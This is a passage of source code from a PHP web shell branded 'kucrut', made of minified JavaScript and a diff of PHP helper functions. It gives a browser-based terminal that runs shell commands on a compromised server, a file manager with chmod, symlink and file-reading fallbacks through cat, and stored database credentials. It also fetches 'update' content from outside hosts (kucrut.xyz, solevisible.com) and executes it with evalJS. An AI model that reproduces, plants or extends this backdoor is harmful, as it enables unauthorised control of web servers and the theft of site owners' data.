.minimized-text").innerHTML="Terminal",kucrutTerminalSetColorAndSize(i),php_temrinal_using_cgi=!0;var l=kucrutGetTerminalHistory();for(var r in l)d.querySelector("#"+i+" .cmd-history-holder .commands-history").insertAdjacentHTML("afterbegin","<div onclick=\"d.querySelector('#"+i+' .php-terminal-input\').value = this.innerHTML;" class="history-cmd-line">'+l[r]+"</div>")}d.body.style.overflow="hidden"}function kucrutTerminalSetColorAndSize(e){var t=getCookie("kucrut-terminal-color"),a=getCookie("kucrut-terminal-fontsize");void 0!==t&&(d.querySelector("#"+e+" pre.ml1").style.color=t),void 0!==a&&(d.querySelector("#"+e+" pre.ml1").style.fontSize=a)}function kucrutTerminalChangecolor(e,t){d.querySelector("#"+t+" pre.ml1").style.color=e.value,setCookie("kucrut-terminal-color",e.value,2012)}function kucrutGetTerminalHistory(e){var t=getCookie("kucrut-terminal-history");try{t=atob(t),t=JSON.parse(t)}catch(e){t=[]}return void 0!==e&&t.reverse(),t}function changeTerminalFontSize(e,t){var a=d.querySelector("#"+e+" pre.ml1"),i=parseInt(window.getComputedStyle(a,null).getPropertyValue("font-size")),l="";1==t?(l=i+1+"px",a.style.fontSize=l):(l=i-1+"px",a.style.fontSize=l),setCookie("kucrut-terminal-fontsize",l,2012)}function kucrutWalkInTerminalHistory(e,t,a){var i=t||window.event;if("38"==i.keyCode||"40"==i.keyCode||"37"==i.keyCode||"39"==i.keyCode)switch(i.keyCode){case 38:var l=kucrutGetTerminalHistory(!0),r="";0==terminal_walk_index[a].index?(0==terminal_walk_index[a].key&&++terminal_walk_index[a].index,void 0!==(r=l[terminal_walk_index[a].index])?(e.value=r,++terminal_walk_index[a].index):(e.value="",terminal_walk_index[a].index=0)):terminal_walk_index[a].index<l.length&&(0==terminal_walk_index[a].key&&++terminal_walk_index[a].index,e.value=l[terminal_walk_index[a].index],++terminal_walk_index[a].index),terminal_walk_index[a].key=1;break;case 40:l=kucrutGetTerminalHistory(!0);if(terminal_walk_index[a].index>=0)0!=terminal_walk_index[a].index&&(--terminal_walk_index[a].index,1==terminal_walk_index[a].key&&--terminal_walk_index[a].index),void 0!==(r=l[terminal_walk_index[a].index])?e.value=r:(e.value="",terminal_walk_index[a].index=0);terminal_walk_index[a].key=0;break;default:console.log(i.keyCode)}else terminal_walk_index[a].index=0}function clearTerminalHistory(){d.querySelectorAll(".commands-history").forEach(function(e){e.innerHTML=""}),setCookie("kucrut-terminal-history","",2012)}function kucrutAceToFullscreen(e){var t=e.getAttribute("ace_id");kucrut_ace_editors.editor[t].container.requestFullscreen()}function closeHistoryCmd(e,t){if("free"==e){var a=t.getAttribute("term_id");return e=d.querySelector("#"+a+" .cmd-history-icon"),d.querySelector("#"+a+" .cmd-history-holder").style.visibility="hidden",d.querySelector("#"+a+" .cmd-history-holder").style.opacity="0",e.setAttribute("mode","off"),!1}var i=e.getAttribute("mode"),l=(a=e.getAttribute("term_id"),d.querySelector("#"+a+" .cmd-history-holder"));0==i.length||"off"==i?(l.style.visibility="visible",l.style.opacity="1",e.setAttribute("mode","on")):(l.style.visibility="hidden",l.style.opacity="0",e.setAttribute("mode","off"))}function geEvalAceValue(e){var t=e.querySelector(".php-evals-ace").getAttribute("id");return kucrut_ace_editors.eval[t].getValue()}function kucrutOpenArchive(e){var t=e.getAttribute("path"),a=e.getAttribute("fname"),i=e.getAttribute("base_id");if(".."==a&&"phar://"!=t.substr(0,7))return!1;var l="a="+kucrutb64("open_archive_dir")+"&c="+kucrutb64(c_)+"&kucrut1="+kucrutb64(t)+"&kucrut2="+kucrutb64(i)+"&ajax="+kucrutb64("true");_Ajax(d.URL,l,function(e){if("0"!=e){$("archive_base_"+i).innerHTML=e;var a=$("archive_dir_"+i).getAttribute("archive_name"),l=$("archive_dir_"+i).getAttribute("archive_full"),r="",o="";if(0!=(t=t.split(a)[1]).length){var n=(t=t.split("/")).length-1;for(var s in 0==t[n].length&&t.splice(n,1),t)0!=t.length&&(o+=t[s]+"/",r+='<a base_id="'+i+'" fname="'+t[s]+'" path="'+l+o+'" onclick="kucrutOpenArchive(this);">'+t[s]+"/</a>")}d.querySelector("#archive_dir_"+i+" .archive_pwd_holder").innerHTML=r}},!1,"open_archive_dir")}function kucrutDeleteConnectToDb(e){d.querySelectorAll(".dbh_"+e).forEach(function(e){e.remove()}),kucrutConnectionHistoryUpdate(e)}function kucrutConnectToDb(e,t){var a={};try{a=JSON.parse(atob(getCookie("kucrut_connection_hist")))}catch(e){}var i=d.querySelector("#"+t+" div.sf");i.querySelector("input[name=sql_host]").value=a[e].host,i.querySelector("input[name=sql_login]").value=a[e].user,i.querySelector("input[name=sql_pass]").value=a[e].pass,(i.querySelector("input[name=sql_base]")?i.querySelector("input[name=sql_base]"):i.querySelector("select[name=sql_base]")).value=a[e].db,i.querySelector("input[name=sql_count]").checked=!0,d.querySelector("#"+t+" div.sf .db-connect-btn").click()}function kucrutShowConnectionHistory(e){var t={},a=e.getAttribute("db_id"),i=e.getAttribute("mode");if(rows='<table class="connection-hist-table"><tr><th>*</th><th>Host</th><th>User</th><th>Pass</th><th>Database</th><th>Connect</th><th>Delete</th></tr>',"on"==i){e.setAttribute("mode","off");try{t=JSON.parse(atob(getCookie("kucrut_connection_hist")))}catch(e){}var l,r=1;for(l in t){var o=t[l].user+"_"+t[l].db;rows+='<tr class="dbh_'+o+'"><th>'+r+"</th><th>"+t[l].host+"</th><th>"+t[l].user+"</th><th>"+t[l].pass+"</th><th>"+t[l].db+'</th><th><button style="margin: unset;" class="connection-his-btn" onclick=\'kucrutConnectToDb("'+o+'","'+a+'");\'>Connect</button></th><th style="text-align: center;"><button style="margin: unset;" class="connection-his-btn connection-delete" onclick=\'kucrutDeleteConnectToDb("'+o+"\");'>X</button></th></tr>",r++}rows+="</table"}else e.setAttribute("mode","on"),rows="";d.querySelector("#"+a+" .connection_history_holder").innerHTML=rows}function kucrutConnectionHistoryUpdate(e){var t,a={};try{a=JSON.parse(atob(getCookie("kucrut_connection_hist")))}catch(e){}for(t in mysql_cache)0!=mysql_cache[t].db.length&&(a[mysql_cache[t].user+"_"+mysql_cache[t].db]=mysql_cache[t]);void 0!==e&&delete a[e],setCookie("kucrut_connection_hist",btoa(JSON.stringify(a)),2012)}function kucrutExecTerminal(e,t){var a="";if(0==(a=void 0!==t?"cd "+c_:e.c.value).length)return!1;"l"==a?a="ls -trh --color":"ll"==a&&(a="ls -ltrh --color");var i=e.getAttribute("term_id");kucrutloader(i,"block"),closeHistoryCmd("free",e);var l="";"FORM"==e.tagName&&(l=e.querySelector(".php-terminal-current-dir").innerHTML),0==(l=l.trim()).length&&(l=c_);var r="a="+kucrutb64("terminalExec")+"&c="+kucrutb64(l)+"&kucrut1="+kucrutb64(a)+"&ajax="+kucrutb64("true");if(_Ajax(d.URL,r,function(e,t){kucrutloader(t,"none");try{var a=$("tab_"+i);null!=a&&((-1==a.classList.value.indexOf("active-terminal-tab")||cgi_is_minimized)&&(a.classList.add("tab-is-done"),kucrutShowNotification("proccess is done...",a.innerText)),cgi_is_minimized&&kucrutUpdateOptionsBadge("cgiloader"))}catch(e){}e=JSON.parse(e),d.querySelector("#"+t+" .php-terminal-output > pre").innerHTML=e.output,0!=e.path.length&&(d.querySelector("#"+t+" .php-terminal-current-dir").innerHTML=e.path)},!1,i),void 0===t){d.querySelector("#"+i+" .cmd-history-holder .commands-history").insertAdjacentHTML("afterbegin","<div onclick=\"d.querySelector('#"+i+' .php-terminal-input\').value = this.innerHTML;" class="history-cmd-line">'+a+"</div>");var o=kucrutGetTerminalHistory(),n=o.indexOf(a);-1!=n&&o.splice(n,1),o.push(a),setCookie("kucrut-terminal-history",btoa(JSON.stringify(o)),2012)}d.querySelector("#"+i+" input.php-terminal-input").focus()}function pageChangedFilesMan(e){var t="filesman_holder_"+kucrut_current_fm_id,a=getCookie(t+"_page_number"),i=e.innerText;if("<<"==i){a=d.querySelector("#"+t+" .active-page-number").innerText;if(!((a=parseInt(a))>1))return!1;i=a-1}if(">>"==i){a=d.querySelector("#"+t+" .active-page-number").innerText;a=parseInt(a);var l=d.querySelector("#"+t+" .last-page-number").innerHTML;if(!(a+1<=(l=parseInt(l))))return!1;i=a+1}setCookie(t+"_page_number",i,2012),g("FilesMan",c_)}function kucrutColDumperInit(){var e=d.querySelector(".tab_name.tab_is_active").getAttribute("opt_id"),t=d.querySelector("#"+e),a=t.getElementsByClassName("box");for(i=0;i<a.length;i++)a[i].addEventListener("click",function(){null!=this.parentElement.querySelector(".nested")&&(this.parentElement.querySelector(".nested").classList.toggle("active"),this.classList.toggle("check-box"))});var i;a=t.getElementsByClassName("sub-box");for(i=0;i<a.length;i++)a[i].setAttribute("opt_id",e),a[i].addEventListener("click",function(){this.classList.toggle("check-box");var e=this.getAttribute("tbl"),t=this.getAttribute("opt_id");t=t.replace("option_",""),col_dumper_selected_data.hasOwnProperty(t)||(col_dumper_selected_data[t]={}),void 0===col_dumper_selected_data[t][e]&&(col_dumper_selected_data[t][e]=[]);var a=this.innerHTML,i=col_dumper_selected_data[t][e].indexOf(a);-1==i?col_dumper_selected_data[t][e].push(a):col_dumper_selected_data[t][e].splice(i,1)})}function showSymlinkPath(e,t){t.stopPropagation();var a=e.getAttribute("row"),i=$("td_row_"+a),l=e.getAttribute("opt_title"),r=e.getAttribute("fname");if(l=decodeURIComponent(r)+" -> "+l,null!=i){i.insertAdjacentHTML("afterbegin",'<div class="symlink_path" id="link_id_'+a+'">'+l+"</div>");var o=t.clientX,n=t.clientY-30;$("link_id_"+a).style.left=o+"px",$("link_id_"+a).style.top=n+"px"}}function hideSymlinkPath(e,t){t.stopPropagation(),$("link_id_"+e.getAttribute("row")).remove()}function kucrutgetFlags(){data="a="+kucrutb64("get_flags")+"&c="+kucrutb64(c_)+"&ajax="+kucrutb64("true"),_Ajax(d.URL,data,function(e){var t=JSON.parse(e);t.hasOwnProperty("server")&&(d.querySelectorAll(".flag-holder")[0].innerHTML='<img draggable="false" title="'+t.server.name+'" src="https://solevisible.com/images/flags/48/'+t.server.code.toLowerCase()+'.png">',d.querySelectorAll(".flag-holder")[0].style.display="inline"),t.hasOwnProperty("client")&&(d.querySelectorAll(".flag-holder")[1].innerHTML='<img draggable="false" title="'+t.client.name+'" src="https://solevisible.com/images/flags/48/'+t.client.code.toLowerCase()+'.png">',d.querySelectorAll(".flag-holder")[1].style.display="inline")})}function colDumplerSelectType(e){var t=e.options[e.selectedIndex].value;$("coldumper-delimiter-input").style.display="delimiter"==t?"inline-block":"none"}function kucrutCheckUrlHash(){var e=window.location.hash.substr(1),t=e.split("&").reduce(function(e,t){var a=t.split("=");return e[a[0]]=a[1],e},{});if(""!=e)switch(t.action){case"fileman":case"options":t.path=decodeURIComponent(t.path),g("FilesMan",t.path,function(e){if(t.hasOwnProperty("file")){var a="auto";isArchive(t.file)&&(a="view"),editor(t.path+"/"+t.file,a,"","","","file")}}),"options"==t.action&&t.hasOwnProperty("opt")&&(kucrut_can_add_opt=!0,g(t.opt,null,"","",""),d.querySelector(".opt-title").innerHTML=$("menu_opt_"+t.opt).innerHTML),t.hasOwnProperty("file")||editorClose("editor"),t.hasOwnProperty("opt")||editorClose("options_window"),editorClose("cgiloader");break;default:g("FilesMan","<?php echo $GLOBALS["cwd"]; ?>"),editorClose("editor"),editorClose("options_window"),editorClose("cgiloader")}else g("FilesMan","<?php echo $GLOBALS["cwd"]; ?>"),editorClose("editor"),editorClose("options_window"),editorClose("cgiloader")}function kucrutFmngrContextRow(){d.querySelectorAll(".fmanager-row a.main_name").forEach(function(e){e.addEventListener("contextmenu",function(e){var t=e.target,a="";if(".."==(a="A"==e.target.parentElement.tagName?(t=e.target.parentElement).getAttribute("fname"):t.getAttribute("fname")))return!1;var i=t.getAttribute("id"),l=t.getAttribute("path"),r=t.getAttribute("ftype"),o=["newtab","link","download","view","edit","move","copy","rename","modify","permission","compress","extract","delete"];for(var n in"file"!=r||isArchive(a)?o[3]="view_archive":o.splice(11,1),"folder"==r&&(o=["newtab","link","move","copy","rename","modify","permission","compress","delete"]),kucrutSortMenuItems(o),o){var s=d.querySelector("#rightclick_menu > a[name="+o[n]+"]");switch(s.setAttribute("fid",i),s.setAttribute("fname",decodeURIComponent(a)),s.setAttribute("path",l),s.setAttribute("ftype",r),o[n]){case"view":case"edit":var c="auto";"edit"==o[n]&&(c="edit"),s.setAttribute("href","#action=fileman&path="+c_+"/&file="+a),s.setAttribute("onclick","editor('"+a+"','"+c+"','','','','file')");break;case"newtab":var u=a;"file"==r?(u="&file="+a,s.setAttribute("href","#action=fileman&path="+c_+"/"+u),s.setAttribute("target","_blank"),s.onclick=function(){}):(s.setAttribute("href","javascript:void(0)"),s.removeAttribute("target"),s.onclick=function(){kucrutFilesManNewTab(c_,u)});break;case"delete":s.setAttribute("onclick","var chk = confirm('Are You Sure For Delete # "+a+" # ?'); chk ? g('FilesMan',null,'delete', '"+a+"') : '';");break;case"download":s.setAttribute("onclick","g('FilesTools',null,'"+a+"', 'download')");break;case"permission":try{var p=d.querySelector("#id_chmode_"+i.replace("id_","")+" span").innerHTML;s.setAttribute("perm",p.trim())}catch(e){}break;case"link":s.style.display="block";var f="<?php echo $_SERVER["DOCUMENT_ROOT"]; ?>/",m=(c_+"/"+a).replace(/\/\//g,"/");if(-1!=m.indexOf(f)){f=m.replace(f,"");var b=location.origin+"/"+f;s.setAttribute("href",""+b)}else s.style.display="none"}}var y=e.clientX,_=e.clientY;kucrutRightClickMenu(y,_),e.preventDefault()})})}function kucrutFilesManNewTab(e,t,a){var i=t;void 0!==a&&(i=kucrutGetLastFolderName(e));var l=decodeURIComponent(e+"/"+t);l=l.replace(/\/\//g,"/");var r=$("filesman_tab_1"),o=r.getAttribute("fm_counter");o=parseInt(o)+1,r.setAttribute("fm_counter",o),d.querySelector("#filesman_tabs_child").insertAdjacentHTML("beforeend",'<div onmouseover="kucrutFilesmanTabShowTitle(this,event);" onmouseout="kucrutFilesmanTabHideTitle(this,event);" path="'+l+'" id="filesman_tab_'+o+'" fm_id="'+o+'" onclick="filesmanTabController(this);" fname="'+t+'" class="filesman_tab"><img class="folder-tab-icon" src="https://solevisible.com/icons/menu/folder2.svg"> <span class="filesman-tab-folder-name">'+i+'</span> <img fm_id="'+o+'" onclick="closeFmTab(this,event);return false;" title="[close]" src="https://kucrut.xyz/images/delete.svg"></div>'),d.querySelector(".ajaxarea").insertAdjacentHTML("beforebegin",'<div style="position:relative;" fm_id="'+o+'" id="filesman_holder_'+o+'" class="ajaxarea"><div class="header"></div></div>'),kucrut_fm_id=o,g("FilesMan",l),kucrut_fm_id=0}function kucrutFilesmanTabShowTitle(e,t){t.stopPropagation();var a=$("filesman-tab-full-path");a.style.display="block",a.style.top=e.offsetTop-37+"px",a.style.left=e.offsetLeft-$("filesman_tabs").scrollLeft+"px",a.innerHTML=e.getAttribute("path")}function kucrutFilesmanTabHideTitle(e,t){$("filesman-tab-full-path").style.display="none"}function kucrutPopupAction(e,t){var a="",i="";switch(t){case"rename":a="Old file name:",i="New file name:";break;case"copy":a="File path:",i="Enter the file path that you want to copy this file to:";break;case"move":a="Current Path:",i="Enter the file path that you want to move this file to:";break;case"extract":a="Files to extract:",i="Enter the path you wish to extract the files to and click Extract:"}var l=e.getAttribute("fname"),r=e.getAttribute("path"),o=t.charAt(0).toUpperCase()+t.slice(1);if("permission"==t){d.querySelector("#shortcutMenu-holder").style.height="222px",o="Change Permissions",d.querySelector("#shortcutMenu-holder > form > .perm-table-holder").style.display="block",d.querySelector("#shortcutMenu-holder > form > input[name=fname]").style.display="none";var n=e.getAttribute("perm"),s=n.substr(1,1),c=n.substr(2,1),u=n.substr(3,1);d.querySelector("#shortcutMenu-holder > form input[name=u]").value=s,d.querySelector("#shortcutMenu-holder > form input[name=g]").value=c,d.querySelector("#shortcutMenu-holder > form input[name=w]").value=u,autoCheckPerms(s,"u",["u","g","w"]),autoCheckPerms(c,"g"),autoCheckPerms(u,"w")}else d.querySelector("#shortcutMenu-holder").style.height="190px",d.querySelector("#shortcutMenu-holder > form > input[name=fname]").style.display="block",d.querySelector("#shortcutMenu-holder > form > .perm-table-holder").style.display="none";var p="move"==t||"copy"==t?r+l:l;if("modify"==t){var f="tr_row_"+e.getAttribute("fid").replace("id_","");p=d.querySelector("#"+f+" .main_modify").innerText}d.querySelector(".cl-popup-fixed").style.display="block",d.querySelector("#shortcutMenu-holder .popup-head").innerHTML=o,d.querySelector("#shortcutMenu-holder .old-path-lbl").innerHTML=a,d.querySelector("#shortcutMenu-holder .new-filename-lbl").innerHTML=i,d.querySelector("#shortcutMenu-holder .popup-foot > button[name=accept]").innerHTML=o,d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML=r+l,d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value=p,d.querySelector("#shortcutMenu-holder button[name=accept]").setAttribute("fid",e.getAttribute("fid")),d.querySelector("#shortcutMenu-holder button[name=accept]").setAttribute("action",t)}function calcperm(){var e=event.srcElement;autoCheckPerms(e.checked,e.name.substr(0,1))}function autoCheckPerms(e,t,a){if(void 0!==a)for(var i in a){var l=a[i];d.querySelector("#shortcutMenu-holder > form input[name="+l+"r]").checked=!1,d.querySelector("#shortcutMenu-holder > form input[name="+l+"w]").checked=!1,d.querySelector("#shortcutMenu-holder > form input[name="+l+"x]").checked=!1}var r=d.querySelector("#shortcutMenu-holder > form input[name="+t+"r]"),o=d.querySelector("#shortcutMenu-holder > form input[name="+t+"w]"),n=d.querySelector("#shortcutMenu-holder > form input[name="+t+"x]");if("boolean"!=typeof e)"7"==e?(r.checked=!0,o.checked=!0,n.checked=!0):"4"==e?r.checked=!0:"2"==e?o.checked=!0:"1"==e?n.checked=!0:"6"==e?(r.checked=!0,o.checked=!0):"3"==e?(o.checked=!0,n.checked=!0):"5"==e&&(r.checked=!0,n.checked=!0);else{var s=0;r.checked&&(s+=4),o.checked&&(s+=2),n.checked&&(s+=1),"u"==t?d.querySelector("#shortcutMenu-holder > form input[name=u]").value=s:"g"==t?d.querySelector("#shortcutMenu-holder > form input[name=g]").value=s:"w"==t&&(d.querySelector("#shortcutMenu-holder > form input[name=w]").value=s)}}function gg(e,t,a,i,l,r){var o="filesman_holder_"+kucrut_current_fm_id;kucrutloader(o,"block"),data="a="+kucrutb64(e)+"&c="+kucrutb64(t)+"&kucrut1="+kucrutb64(a)+"&kucrut2="+kucrutb64(i)+"&kucrut3="+kucrutb64(l)+"&ajax="+kucrutb64("true"),_Ajax(d.URL,data,r,!1,o)}function kucrutPopUpDoAction(e){var t=e.getAttribute("action");switch(t){case"rename":case"move":case"copy":var a=e.getAttribute("fid").replace("id_",""),i=$("id_"+a).getAttribute("fname"),l=d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value;l=l.trim(),i=i.trim(),gg("doActions",c_,i,l,t,function(e,i){if("rename"==t)if("done"==e){var r=$("id_"+a);updateFileEditor(a,l);var o=r.getAttribute("path")+$("id_"+a).getAttribute("fname");d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML=o,r.addEventListener("animationend",function(){r.classList.remove("textEffect")}),r.classList.add("textEffect"),kucrutShowNotification("Renamed...","Rename Action"),d.querySelector(".cl-popup-fixed").style.display="none"}else kucrutShowNotification("error...!","Rename Action","error");kucrutloader(i,"none")});break;case"permission":var r=d.querySelector("#shortcutMenu-holder > form input[name=u]").value,o=d.querySelector("#shortcutMenu-holder > form input[name=g]").value,n=d.querySelector("#shortcutMenu-holder > form input[name=w]").value;i=(i=d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML).trim();var s=r.trim()+o.trim()+n.trim();gg("doActions",c_,i,s,t,function(e,t){kucrutloader(t,"none"),kucrutShowNotification(e,"Permission Action"),d.querySelector(".cl-popup-fixed").style.display="none"});break;case"modify":a=e.getAttribute("fid").replace("id_","");var c=d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value,u=$("id_"+a).getAttribute("fname");gg("doActions",c_,c,u,t,function(t,a){if("ok"==t){var i="tr_row_"+e.getAttribute("fid").replace("id_","");d.querySelector("#"+i+" .main_modify").innerHTML=c,kucrutShowNotification("success...","Modify Action"),d.querySelector(".cl-popup-fixed").style.display="none"}else kucrutShowNotification(t,"Modify Action","error");kucrutloader(a,"none")})}}function kucrutInitSoratableTab(e){Sortable.create(e,{direction:"horizontal",animation:300,ghostClass:"sortable-ghost",filter:".not-sortable"})}$("search-input").addEventListener("keydown",function(e){setTimeout(function(){var e=$("search-input").value;for(var t in d.getElementsByClassName("history-list")[0].innerHTML="",editor_files)if(-1!=editor_files[t].file.search(e)||""==e){var a=0;t==editor_current_file&&(a=" is_active"),insertToHistory(t,editor_files[t].file,a,editor_files[t].type)}},100)},!1),_Ajax(d.URL,"a="+kucrutb64("checkupdate"),function(e){if(0!=e.length&&"[]"!=e){var t=JSON.parse(e);if(t.hasOwnProperty("content")){d.body.insertAdjacentHTML("beforeend",t.content);try{evalJS(t.content)}catch(t){}}if(t.hasOwnProperty("copyright")&&($("kucrut-copyright").innerHTML=t.copyright),t.hasOwnProperty("solevisible")&&($("kucrut_solevisible").innerHTML=t.solevisible),t.hasOwnProperty("code_name")&&($("hidden_sh").innerHTML=t.code_name.replace(/\{version\}/g,t.version_number)),t.hasOwnProperty("market")){var a=d.querySelector("span.kucrut_plus");if(t.market.hasOwnProperty("visible")&&"yes"==t.market.visible&&($("menu_opt_market").style.display="inline"),"open"!=t.market.status&&(a.style.color="#ffc107"),t.market.hasOwnProperty("content"))try{evalJS(t.market.content)}catch(t){}}}}),<?php echo $GLOBALS["need_to_update_header"]; ?>?_Ajax(d.URL,"a="+kucrutb64("updateheader"),function(e){try{var t=JSON.parse(e);for(var a in t){for(var i="",l=0;l<t[a].length;l++)i+="useful"==a||"downloader"==a?'<span class="header_values" style="margin-left: 4px;">'+t[a][l]+"</span>":t[a][l];var r=$("header_"+a);r&&(r.innerHTML=i)}$("header_cgishell").innerHTML="ON",$("header_cgishell").setAttribute("class","header_on")}catch(e){}}):islinux&&_Ajax(d.URL,"a="+kucrutb64("checkcgi"),function(e){"ok"==e&&($("header_cgishell").innerHTML="ON",$("header_cgishell").setAttribute("class","header_on"))}),function(){d.onclick=function(){can_hashchange_work=!1,setTimeout(function(){can_hashchange_work=!0},600)},window.onhashchange=function(e){can_hashchange_work&&kucrutCheckUrlHash()},kucrutCheckUrlHash(),kucrutgetFlags(),rightclick_menu_context=$("rightclick_menu").style,kucrutInitCwdContext(),document.addEventListener("click",function(e){rightclick_menu_context.opacity="0",setTimeout(function(){rightclick_menu_context.visibility="hidden"},501)},!1);var e=document.createElement("script");e.src="https://cdnjs.cloudflare.com/ajax/libs/Sortable/1.10.2/Sortable.min.js",e.id="sortable-plugin",e.onload=function(){kucrutInitSoratableTab($("filesman_tabs_child")),kucrutInitSoratableTab(d.querySelector(".editor-tabs")),kucrutInitSoratableTab(d.querySelector(".options_tab")),kucrutInitSoratableTab(d.querySelector(".terminal-tabs")),kucrutInitSoratableTab(d.querySelector(".sql-tabs"))},d.body.appendChild(e)}();
@@ -2729,23 +2729,23 @@ else
 return $s . ' B';
 }
 function kucrutPerms($p) {
-if (($p & 0xC000) == 0xC000)$i = 'sâ€‹';
-elseif (($p & 0xA000) == 0xA000)$i = 'lâ€‹';
-elseif (($p & 0x8000) == 0x8000)$i = '-â€‹';
-elseif (($p & 0x6000) == 0x6000)$i = 'bâ€‹';
-elseif (($p & 0x4000) == 0x4000)$i = 'dâ€‹';
-elseif (($p & 0x2000) == 0x2000)$i = 'câ€‹';
-elseif (($p & 0x1000) == 0x1000)$i = 'pâ€‹';
-else $i = 'uâ€‹';
-$i .= (($p & 0x0100) ? 'râ€‹' : '-');
-$i .= (($p & 0x0080) ? 'wâ€‹' : '-');
-$i .= (($p & 0x0040) ? (($p & 0x0800) ? 'sâ€‹' : 'xâ€‹' ) : (($p & 0x0800) ? 'Sâ€‹' : '-'));
-$i .= (($p & 0x0020) ? 'râ€‹' : '-');
-$i .= (($p & 0x0010) ? 'wâ€‹' : '-');
-$i .= (($p & 0x0008) ? (($p & 0x0400) ? 'sâ€‹' : 'xâ€‹' ) : (($p & 0x0400) ? 'Sâ€‹' : '-'));
-$i .= (($p & 0x0004) ? 'râ€‹' : '-');
-$i .= (($p & 0x0002) ? 'wâ€‹' : '-');
-$i .= (($p & 0x0001) ? (($p & 0x0200) ? 'tâ€‹' : 'xâ€‹' ) : (($p & 0x0200) ? 'Tâ€‹' : '-'));
+if (($p & 0xC000) == 0xC000)$i = 's​';
+elseif (($p & 0xA000) == 0xA000)$i = 'l​';
+elseif (($p & 0x8000) == 0x8000)$i = '-​';
+elseif (($p & 0x6000) == 0x6000)$i = 'b​';
+elseif (($p & 0x4000) == 0x4000)$i = 'd​';
+elseif (($p & 0x2000) == 0x2000)$i = 'c​';
+elseif (($p & 0x1000) == 0x1000)$i = 'p​';
+else $i = 'u​';
+$i .= (($p & 0x0100) ? 'r​' : '-');
+$i .= (($p & 0x0080) ? 'w​' : '-');
+$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's​' : 'x​' ) : (($p & 0x0800) ? 'S​' : '-'));
+$i .= (($p & 0x0020) ? 'r​' : '-');
+$i .= (($p & 0x0010) ? 'w​' : '-');
+$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's​' : 'x​' ) : (($p & 0x0400) ? 'S​' : '-'));
+$i .= (($p & 0x0004) ? 'r​' : '-');
+$i .= (($p & 0x0002) ? 'w​' : '-');
+$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't​' : 'x​' ) : (($p & 0x0200) ? 'T​' : '-'));
 return $i;
 }
 function kucrutPermsColor($f,$isbash=false){
@@ -2788,91 +2788,91 @@ $file_ary[$i][$key] = $file_post[$key][$i];
 return $file_ary;
 }
 function _kucrut_can_runCommand($cgi=true,$cache=true){
-	if(isset($_COOKIE["kucrut_canruncmd"])&&$cache){
-		return true;
-	}
-	if(strlen(kucrutEx("whoami",false,$cgi))>0){
-		$_COOKIE["kucrut_canruncmd"] = true;
-		return true;
-	}
-	return false;
+    if(isset($_COOKIE["kucrut_canruncmd"])&&$cache){
+        return true;
+    }
+    if(strlen(kucrutEx("whoami",false,$cgi))>0){
+        $_COOKIE["kucrut_canruncmd"] = true;
+        return true;
+    }
+    return false;
 }
 function _kucrut_symlink($target, $link){
-	$phpsym = function_exists("symlink");
-	if($phpsym){
-		@symlink($target, $link);
-	}else{
-		kucrutEx("ln -s '".addslashes($target)."' '".addslashes($link)."'");
-	}
+    $phpsym = function_exists("symlink");
+    if($phpsym){
+        @symlink($target, $link);
+    }else{
+        kucrutEx("ln -s '".addslashes($target)."' '".addslashes($link)."'");
+    }
 }
 function _kucrut_file_exists($file,$cgi=true){
-	if(@file_exists($file)){
-		return true;
-	}else{
-		if(strlen(kucrutEx("ls -la '".addslashes($file)."'",false,$cgi))>0){
-			return true;
-		}
-	}
-	return false;
+    if(@file_exists($file)){
+        return true;
+    }else{
+        if(strlen(kucrutEx("ls -la '".addslashes($file)."'",false,$cgi))>0){
+            return true;
+        }
+    }
+    return false;
 }
 function _kucrut_file($file,$cgi=true){
-	$array = @file($file);
-	if(!$array){
-		if(strlen(kucrutEx("id",false,$cgi))>0){
-			$data = kucrutEx('cat "'.addslashes($file).'"',false,$cgi);
-			if(strlen($data)>0){
-				return explode("\n", $data);
-			}else{
-				return false;
-			}
-		}else{
-			return false;
-		}
-	}else{
-		return $array;
-	}
+    $array = @file($file);
+    if(!$array){
+        if(strlen(kucrutEx("id",false,$cgi))>0){
+            $data = kucrutEx('cat "'.addslashes($file).'"',false,$cgi);
+            if(strlen($data)>0){
+                return explode("\n", $data);
+            }else{
+                return false;
+            }
+        }else{
+            return false;
+        }
+    }else{
+        return $array;
+    }
 }
 function _kucrut_is_writable($file){
-	$check = false;
-	$check = @is_writable($file);
-	if(!$check){
-		if(_kucrut_can_runCommand()){
-			$check = kucrutEx('[ -w "'.trim(addslashes($file)).'" ] && echo "yes" || echo "no"');
-			if($check == "yes"){
-				$check = true;
-			}else{
-				$check = false;
-			}
-		}
-	}
-	return $check;
+    $check = false;
+    $check = @is_writable($file);
+    if(!$check){
+        if(_kucrut_can_runCommand()){
+            $check = kucrutEx('[ -w "'.trim(addslashes($file)).'" ] && echo "yes" || echo "no"');
+            if($check == "yes"){
+                $check = true;
+            }else{
+                $check = false;
+            }
+        }
+    }
+    return $check;
 }
 function _kucrut_is_dir($dir,$mode="-d"){
-	$check = false;
-	$check = @is_dir($dir);
-	if($mode == "-e"){
-		$check = @is_file($dir);
-	}
-	if(!$check){
-		if(_kucrut_can_runCommand()){
-			$check = kucrutEx('[ "'.trim($mode).'" "'.trim(addslashes($dir)).'" ] && echo "yes" || echo "no"');
-			if($check == "yes"){
-				return true;
-			}else{
-				return false;
-			}
-		}
-	}
-	return $check;
+    $check = false;
+    $check = @is_dir($dir);
+    if($mode == "-e"){
+        $check = @is_file($dir);
+    }
+    if(!$check){
+        if(_kucrut_can_runCommand()){
+            $check = kucrutEx('[ "'.trim($mode).'" "'.trim(addslashes($dir)).'" ] && echo "yes" || echo "no"');
+            if($check == "yes"){
+                return true;
+            }else{
+                return false;
+            }
+        }
+    }
+    return $check;
 }
 function _kucrut_load_ace_options($base){
